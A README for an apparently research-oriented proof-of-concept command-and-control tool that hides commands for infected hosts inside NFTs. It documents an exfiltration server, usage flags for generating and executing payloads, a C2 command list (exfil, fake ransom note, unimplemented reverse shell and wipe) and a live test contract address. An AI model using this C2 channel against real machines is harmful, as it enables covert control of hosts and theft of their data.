# mFT - Malicious Fungible Token

mFT is a Web3 based C2 PoC that leverages Non-Fungible Tokens (NFTs) as a mechanism for hosting and transmitting commands to compromised or infected hosts.

## Requirements

Install dependencies:

```bash
bundle install
```

Configure your OpenSea API Key in the `config.rb` file:

```ruby
$sea_apikey = "YOUR_API_KEY_HERE"
```

## mFT Exfil Server (mFTExfil.rb)

The exfiltration tool will start a web server which will log any data exfiltrated by mFT clients.

Custom address and port can be configured in the `config.rb` file:

```ruby
#Exfil Server default IP
$ex_default_address = "0.0.0.0"

#Exfil Server default Port
$ex_default_port = 4444
```

## mFT (mFT.rb)

This tool has the capability to both read and execute a malicious payload contained within an NFT. 
It also offers the functionality to provide an execution plan and generate custom payloads for specific purposes. 
Furthermore, if required, the tool can list all NFTs associated with a given address and retrieve detailed information about each one individually.

```ruby
          _____ _____           _ _ _     _   ___    _____ _ _         _   
    _____|   __|_   _|   ___   | | | |___| |_|_  |  |     | |_|___ ___| |_ 
   |     |   __| | |    |___|  | | | | -_| . |_  |  |   --| | | -_|   |  _|
   |_|_|_|__|    |_|           |_____|___|___|___|  |_____|_|_|___|_|_|_|                                                                   
                                      mFT - Client v0.01 - Mauro Eldritch     

Usage: mFT [options]
    -g, --generate                              Generate a malicious payload
    -x ADDRESS,IDENTIFIER,BLOCKCHAIN,
        --execute                               Execute a specific NFT's malicious payload
    -d ADDRESS,IDENTIFIER,BLOCKCHAIN,
        --decode                                Decode a specific NFT's malicious payload
    -l, --list ACCOUNT,BLOCKCHAIN               List account NFTs
    -i ADDRESS,IDENTIFIER,BLOCKCHAIN,
        --info                                  Get details for a specific NFT
```

### C2 Commands List

- `id`: Grabs hostname and IP address.
- `exfil`: Attempts to exfiltrate information via a POST request against the exfiltration server.
- `encrypt`: Dummy command which should encrypt the filesystem, but only creates a fake ransom note on the desktop.
- `shell`: Dummy command which should open a reverse shell **(not implemented)**.
- `wipe`: Dummy command which should wipe the filesystem **(not implemented)**.

### Test Contract & NFT

A test collection was published for users to run local tests. Use the NFT Address `0xd838b011c90643b6623393a94405a5e3c199b1fc` with ID `1` or `2` and `ethereum` blockchain on the examples below. The collection features my golden retriever and partner in crime Leopoldo, better known as "Golden Locker" or "*Treat* Actor" in the underground.

- NFTs: https://opensea.io/assets/ethereum/0xd838b011c90643b6623393a94405a5e3c199b1fc/1 & https://opensea.io/assets/ethereum/0xd838b011c90643b6623393a94405a5e3c199b1fc/2
- Holder (my test account): `0x942773F094f0C170AB8835e28f9B0b0b223e043A`
- Collection: https://opensea.io/collection/malicious-fungible-tokens 
- Contract: https://etherscan.io/token/0xd838b011c90643b6623393a94405a5e3c199b1fc 

### Examples:

```bash
#Note: Blockchain argument is optional for all cases. Default value: "ethereum".

#Run Exfiltration Server
ruby mFTExfil.rb

#Generate a payload interactively
ruby mFT.rb -g

#List all NFTs from a given address
ruby mFT.rb -l "0x942773F094f0C170AB8835e28f9B0b0b223e043A"

#Decode and explain a payload step by step ("2" can be used as the second parameter)
ruby mFT.rb --decode "0xd838b011c90643b6623393a94405a5e3c199b1fc","1"

#Execute a payload ("2" can be used as the second parameter)
ruby mFT.rb --execute "0xd838b011c90643b6623393a94405a5e3c199b1fc","1"

#Get information for a specific NFT ("2" can be used as the second parameter)
ruby mFT.rb --info "0xd838b011c90643b6623393a94405a5e3c199b1fc","1"
```

## See also

- The Hacker News - EtherHiding: https://thehackernews.com/2023/10/binances-smart-chain-exploited-in-new.html
- Guardio Labs - EtherHiding: https://labs.guard.io/etherhiding-hiding-web2-malicious-code-in-web3-smart-contracts-65ea78efad16